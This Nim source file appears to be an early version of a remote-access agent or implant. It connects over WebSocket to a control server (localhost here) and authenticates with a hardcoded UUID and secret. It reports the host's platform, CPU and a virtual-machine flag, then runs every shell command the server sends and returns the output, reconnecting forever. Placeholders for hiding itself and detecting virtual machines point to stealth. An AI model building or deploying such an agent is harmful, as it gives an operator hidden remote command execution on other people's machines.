# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.

import std/json
import osproc
import strformat
import asyncdispatch, ws

const HIDE_SELF = false

# TODO: Implement
if HIDE_SELF:
  discard

const UUID = "fe09423a-c414-4c09-b46c-2325296e692b"

const SECRET = "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"

const WS_URL = fmt"ws://127.0.0.1:8000/agent/{UUID}/ws"

var PLATFORM: string

if hostOs == "linux":
  PLATFORM = "linux"
elif hostOs == "windows":
  PLATFORM = "win32"
elif hostOs == "macosx":
  PLATFORM = "darwin"

var IS_VM: bool

proc main() {.async.} =
  var ws = await newWebSocket(WS_URL)

  # Send handshake and identify ourselves
  discard ws.send($(%*{"secret": SECRET, "platform": PLATFORM, "architecture": hostCPU, "vm": IS_VM}))

  let resp = parseJson(await ws.receiveStrPacket())

  echo $resp

  if resp{"status"}.getStr() != "200":
    raise newException(Exception, "Handshake failed")

  while true:
    var packet: JsonNode

    try:
      packet = parseJson(await ws.receiveStrPacket())
    except JsonParsingError:
      continue

    echo $packet

    # TODO: Handle limitations

    if packet{"command"}.getStr() != "":
      var res = exec_cmd_ex(packet{"command"}.getStr())

      await ws.send($(%*{"status": 200, "output": res.output}))

  ws.close()

when isMainModule:
  while true:
    try:
      waitFor main()
    except Exception as e:
      echo e.msg
      waitFor sleepAsync(5000) 
      